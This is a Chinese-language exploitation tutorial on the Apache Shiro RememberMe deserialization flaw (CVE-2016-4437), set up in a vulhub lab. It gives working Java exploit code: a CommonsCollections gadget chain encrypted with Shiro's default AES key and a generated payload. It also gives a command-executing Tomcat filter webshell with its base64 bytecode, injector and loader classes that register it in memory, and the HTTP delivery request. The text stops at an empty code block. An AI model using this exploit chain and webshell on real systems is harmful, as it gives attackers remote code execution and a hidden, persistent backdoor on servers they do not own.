# Shiro内存马实战

Apache Shiro是一个轻量级 Java 安全框架，核心功能包括：认证、授权和会话管理。 框架存在反序列化设计缺陷，HTTP请求的Cookie中的RememberMe值会被反序列化解析为 Java 对象，RememberMe值的编码方式为：Java对象-\>原生序列化-\>AES。

若攻击者得到服务端使用的AES秘钥，则可以伪造任意序列化数据，可以进一步利用精心构造的序列化数据在服务端反序列化时触发其他类中的方法，从而实现远程代码执行。

# 一、shiro环境搭建

本项目使用vulhub项目提供的docker环境，使用方式如下

```plain
git clone https://github.com/vulhub/vulhub.git
cd vulhub/shiro/CVE-2016-4437
docker-compose up -d
```

访问ip的8080端口即可看到如下登录页，说明环境搭建成功

![](https://cdn.nlark.com/yuque/0/2025/png/117267/1749990400741-8564d726-ae19-4ea7-aa8c-e435c313f532.png)

此靶场使用Java库：commons-collections:3.2.1、commons-beanutils:1.8.3

# 二、执行任意Java代码

仅需3步：

1. 写一段恶意Java代码
2. 利用commons-collections环境TemplatesImpl链加载class字节码
3. 导出payload

新建一个maven项目，pom.xml配置如下，注意，本项目基于Java8

```java
<dependencies>
    <dependency>
        <groupId>org.apache.shiro</groupId>
        <artifactId>shiro-core</artifactId>
        <version>1.2.4</version>
    </dependency>
    <dependency>
        <groupId>org.javassist</groupId>
        <artifactId>javassist</artifactId>
        <version>3.30.2-GA</version>
    </dependency>
    <dependency>
        <groupId>org.apache.tomcat</groupId>
        <artifactId>tomcat-catalina</artifactId>
        <version>9.0.97</version>
    </dependency>
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.2.1</version>
    </dependency>
    <dependency>
        <groupId>javax.servlet</groupId>
        <artifactId>javax.servlet-api</artifactId>
        <version>4.0.1</version>
    </dependency>
</dependencies>
```

这里的恶意代码就是在/tmp目录下创建一个文件，文件名touch.java

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class touch extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("touch /tmp/success");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```

接下来创建出一个java对象并导出序列化文件，TemplatesImpl链可以帮我们完成这一步。`TemplatesImpl`​ 是Java XSLT处理的核心类，其内部 `_bytecodes`​ 字段允许直接加载字节码。通过构造特殊的反序列化链触发其 `getTransletInstance()`​ 方法，可动态加载并执行恶意类（需继承 `AbstractTranslet`​）。在Shiro漏洞利用中，我们通过 `InstantiateTransformer`​ 实例化 `TrAXFilter`​ 来触发该方法，最终实现任意代码执行。

```java

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassPool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.util.ByteSource;
import org.apache.shiro.codec.Base64;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class ShiroPayload extends AbstractTranslet {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        Transformer[] faketransformers = new Transformer[]{new ConstantTransformer(1)};
        byte[] code = ClassPool.getDefault().getCtClass("touch").toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{code});
        setFieldValue(obj, "_name", "xxx");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj})
        };
        Transformer transformersChain = new ChainedTransformer(faketransformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformersChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");

        setFieldValue(transformersChain, "iTransformers", transformers);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(expMap);
        oos.close();


        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));

        ByteSource ciphertext = aes.encrypt(bos.toByteArray(), key);
        System.out.printf(ciphertext.toString());

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```

 在Shiro的RememberMe生成时，AES秘钥使用默认的kPH+bIxk5D2deZiIxcaaaA\=\=，请自行根据实际情况替换，第36行main()方法中的

```java
byte[] code = ClassPool.getDefault().getCtClass("touch").toBytecode();
```

用于获取某个类的字节码，在后面会多次使用此类，本文不再重复贴出代码，请自行替换"touch"为需要加载的类。运行输出：

```plain
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
```

测试效果

![](https://cdn.nlark.com/yuque/0/2025/png/117267/1750032468931-365a44d5-32e0-480c-abf9-e66cfaa238a9.png)

![](https://cdn.nlark.com/yuque/0/2025/png/117267/1750032444054-d330916e-9956-42cd-adba-32625061621c.png)

# 三、尝试注入内存马

准备一个内存马文件MemShell.java，这是一个Filter，若请求中存在cmd参数，则执行命令并返回结果，否则正常返回。

```java
import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.http.HttpFilter;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class MemShell extends HttpFilter {
    @Override
    protected void doFilter(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                response.getWriter().println(line);
            }
        }else {
            chain.doFilter(request, response);
        }
    }
}
```

运行如下代码将MemShell类的字节码导出为Base64，并copy输出结果。

```java
import javassist.*;

import java.net.URLEncoder;
import java.util.Base64;

public class DumpBase64 {
    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        // 从类路径获取CtClass对象
        CtClass ctClass = pool.get("MemShell");
        // 转换为字节数组
        byte[] classBytes = ctClass.toBytecode();
        // 使用BASE64Encoder进行Base64编码
        String code = Base64.getEncoder().encodeToString(classBytes);
        System.out.println(code);
    }
}
```

```java
yv66vgAAADQAUQoAEAAhCAAiCwAjACQKACUAJgoAJQAnBwAoBwApCgAqACsKAAcALAoABgAtCgAGAC4LAC8AMAoAMQAyCwAzADQHADUHADYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAIZG9GaWx0ZXIBAG0oTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQANU3RhY2tNYXBUYWJsZQcANwcAOAcAKAEACkV4Y2VwdGlvbnMHADkHADoBABBNZXRob2RQYXJhbWV0ZXJzAQAHcmVxdWVzdAEACHJlc3BvbnNlAQAFY2hhaW4MABEAEgEAA2NtZAcAOwwAPAA9BwA+DAA/AEAMAEEAQgEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwA4DABDAEQMABEARQwAEQBGDABHAEgHAEkMAEoASwcATAwATQBOBwBPDAAUAFABAAhNZW1TaGVsbAEAHWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwRmlsdGVyAQAQamF2YS9sYW5nL1N0cmluZwEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhAA8AEAAAAAAAAgABABEAEgABABMAAAARAAEAAQAAAAUqtwABsQAAAAAABAAUABUAAwATAAAAeAAFAAgAAABTKxICuQADAgA6BBkExgA+uAAEGQS2AAU6BbsABlm7AAdZGQW2AAi3AAm3AAo6BhkGtgALWToHxgARLLkADAEAGQe2AA2n/+qnAAstKyy5AA4DALEAAAABABYAAAATAAT+AC4HABcHABgHABn5ABgCBwAaAAAABgACABsAHAAdAAAADQMAHgAAAB8AAAAgAAAAAA==
```

新建注入类Inject.java，作用是将这个Filter注册进去。第22行的String code\=上一个操作输出的MemShell的Base64字节码。

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.webresources.StandardRoot;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import javax.servlet.Filter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Hashtable;

public class Inject extends AbstractTranslet{
    String code = "yv66vgAAADQAUQoAEAAhCAAiCwAjACQKACUAJgoAJQAnBwAoBwApCgAqACsKAAcALAoABgAtCgAGAC4LAC8AMAoAMQAyCwAzADQHADUHADYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAIZG9GaWx0ZXIBAG0oTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQANU3RhY2tNYXBUYWJsZQcANwcAOAcAKAEACkV4Y2VwdGlvbnMHADkHADoBABBNZXRob2RQYXJhbWV0ZXJzAQAHcmVxdWVzdAEACHJlc3BvbnNlAQAFY2hhaW4MABEAEgEAA2NtZAcAOwwAPAA9BwA+DAA/AEAMAEEAQgEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwA4DABDAEQMABEARQwAEQBGDABHAEgHAEkMAEoASwcATAwATQBOBwBPDAAUAFABAAhNZW1TaGVsbAEAHWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwRmlsdGVyAQAQamF2YS9sYW5nL1N0cmluZwEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhAA8AEAAAAAAAAgABABEAEgABABMAAAARAAEAAQAAAAUqtwABsQAAAAAABAAUABUAAwATAAAAeAAFAAgAAABTKxICuQADAgA6BBkExgA+uAAEGQS2AAU6BbsABlm7AAdZGQW2AAi3AAm3AAo6BhkGtgALWToHxgARLLkADAEAGQe2AA2n/+qnAAstKyy5AA4DALEAAAABABYAAAATAAT+AC4HABcHABgHABn5ABgCBwAaAAAABgACABsAHAAdAAAADQMAHgAAAB8AAAAgAAAAAA==";
    public StandardContext getContext() {
        WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        try {
            Field field = WebappClassLoaderBase.class.getDeclaredField("resources");
            field.setAccessible(true);
            StandardRoot standardroot = (StandardRoot)field.get(webappClassLoaderBase);
            StandardContext context = (StandardContext) standardroot.getContext();
            return context;
        }catch (Exception e) {
            return null;
        }
    }
    public Filter getFilter() throws Exception {
        byte[] bytes = Base64.getDecoder().decode(code);

        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        method.setAccessible(true);
        Class clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
        Filter filter = (Filter) clazz.newInstance();
        return filter;
    }
    public Inject() throws Exception {
        StandardContext context = getContext();
        Filter filter = getFilter();

        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName("shell");
        filterDef.setFilter(filter);
        filterDef.setFilterClass(filter.getClass().getName());

        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName("shell");
        filterMap.addURLPattern("/*");

        context.addFilterDef(filterDef);
        context.addFilterMapBefore(filterMap);
        context.filterStart();
        System.out.println("注入成功");
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler){}
}
```

设置ShiroPayload.java中加载的类为Inject并运行，复制输出结果到剪切板。并在Yakit或BurpSuite中构造http请求。

```http
POST / HTTP/1.1
Host: Shiro目标所在的IP:端口
Content-Type: application/x-www-form-urlencoded
Cookie: rememberMe=粘贴剪切板中的输出结果到此处
```

如果发送这个包，将会看到服务器提示这是一个错误的请求，并发现内存马并未成功注入。

![](https://cdn.nlark.com/yuque/0/2025/png/117267/1750028193713-c4a8a0b1-9af2-4424-9a10-86c5b91e7ee2.png)

那么这是为什么呢？是因为tomcat中间件对header长度作出了限制，默认大小为8k。

# 四、成功的尝试

那么我们现在就要尝试开始着手解决header大小的问题了，一个思路是Shiro的Payload不含内存马注入类，而是做一个ShellLoader，这个ShellLoader负责从post data部分获取类的字节码并加载执行。

问题变成了在全局无request对象的情况下，如何获取一个request，只有拿到了request对象，才能获取到请求包中的相关信息。

这里可以借助TomcatEcho通用回显，其获取顺序如下

```javascript
Thread.currentThread().getContextClassLoader():WebappClassLoaderBase
  ->resources:org.apache.catalina.webresources.StandardRoot
  ->context:org.apache.catalina.core.StandardContext
  ->context:org.apache.catalina.core.ApplicationContext
  ->service:org.apache.catalina.core.StandardService
  ->connectors:org.apache.catalina.connector.Connector[0]
  ->protocolHandler:org.apache.coyote.AbstractProtocol
  ->handler:org.apache.coyote.AbstractProtocol$ConnectionHandler
  ->global:org.apache.coyote.RequestGroupInfo
  ->processors[]:ArrayList<RequestInfo>
  ->req:org.apache.coyote.Request
  ->getNode(1):org.apache.catalina.connector.Request
```

通过这个链条，我们最终就拿到一个org.apache.catalina.connector.Request对象，此对象继承javax.servlet.http.HttpServletRequest，同时我们还可以通过request.getResponse()构造响应数据。

最终的ShellLoader实现如下

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.*;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.RequestInfo;

import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;


public class ShellLoader extends AbstractTranslet{
    public static Object getField(Object obj, Class<?> clazz, String... fieldNames) throws Exception {
        for (String part : fieldNames) {
            String[] segs = part.split("_", 2);
            Field field = clazz.getDeclaredField(segs[0].split(":")[0]);
            field.setAccessible(true);
            obj = field.get(obj);
            if (segs.length > 1) {
                String[] parts = segs[1].split(":", 2);
                int idx = Integer.parseInt(parts[0]);
                obj = obj instanceof List ? ((List<?>) obj).get(idx) : Array.get(obj, idx);
                clazz = parts.length > 1 ? Class.forName(parts[1]) : obj.getClass();
            } else {
                clazz = part.contains(":") ? Class.forName(part.split(":")[1]) : field.getType();
            }
        }
        return obj;
    }
    static{
        try {
            ArrayList<RequestInfo> infos = (ArrayList<RequestInfo>) getField(
                    Thread.currentThread().getContextClassLoader(),
                    WebappClassLoaderBase.class,
                    "resources:org.apache.catalina.webresources.StandardRoot",
                    "context:org.apache.catalina.core.StandardContext",
                    "context",
                    "service:org.apache.catalina.core.StandardService",
                    "connectors_0:org.apache.catalina.connector.Connector",
                    "protocolHandler:org.apache.coyote.AbstractProtocol",
                    "handler:org.apache.coyote.AbstractProtocol$ConnectionHandler",
                    "global", "processors"
            );
            for (RequestInfo ri : infos){
                org.apache.coyote.Request r = (org.apache.coyote.Request)getField(ri, RequestInfo.class, "req");
                Request  req = (Request) r.getNote(1);
                Response resp = req.getResponse();

                PrintWriter out = resp.getWriter();
                out.flush();

                byte[] bytes = Base64.getDecoder().decode(req.getParameter("code"));
                Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                method.setAccessible(true);
                Class clazz = (Class) method.invoke(ShellLoader.class.getClassLoader(), bytes, 0, bytes.length);
                out.println("load success, classInfo: "+clazz.getName());
                clazz.newInstance();
            }
        } catch (Exception e) {}
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler){}
}
```

其中getField()实现链式反射获取对象是作者的得意之作，最终虽然说并不能减少多少payload体积大小，但是能以一种非常优雅和直观的方式实现对目标对象的链式反射获取。支持语法如下

1.获取对象下的变量

```javascript
getField(user,User.calss,"name") 
//等同效果：user.name
```

2.类型标注和强制转换

```javascript
getField(user,User.calss,
        "name:String"
        "value") 
//等同效果 ((String)user.name).value
```

3.数组和List下标取值

```javascript
getField(user,User.calss,
        "name:String"
        "value_1") 
//等同效果 ((String)user.name).value[1]
```

4.组合下标取值和强制转换

```javascript
getField(user,User.calss,
        "name:String"
        "value_1:char") 
//等同效果 (char)((String)user.name).value[1]
```

5.组合实现TomcatEcho链获取RequestInfo

```javascript
getField(
    Thread.currentThread().getContextClassLoader(),
    WebappClassLoaderBase.class,
    "resources:org.apache.catalina.webresources.StandardRoot",
    "context:org.apache.catalina.core.StandardContext",
    "context",
    "service:org.apache.catalina.core.StandardService",
    "connectors_0:org.apache.catalina.connector.Connector",
    "protocolHandler:org.apache.coyote.AbstractProtocol",
    "handler:org.apache.coyote.AbstractProtocol$ConnectionHandler",
    "global", 
    "processors"
);
```

优雅，非常优雅，对链式调用过程非常直观。

对于缩小编译后的字节码体积，还有一个办法：设置maven编译选项，修改pom.xml

```xml
<build>
  <plugins>
    <plugin>
      <groupId>org.apache.maven.plugins</groupId>
      <artifactId>maven-compiler-plugin</artifactId>
      <version>3.11.0</version>
      <configuration>
        <source>1.8</source>
        <target>1.8</target>
        <debug>false</debug>
        <compilerArgs>
          <arg>-g:none</arg>
        </compilerArgs>
      </configuration>
    </plugin>
  </plugins>
</build>
```

接下来，让我们将这个ShellLoad用ShiroPayload导出吧。记得设置code\=...getCtClass("ShellLoader")...再运行。得到payload。（这是RememberMe部分）

```plain
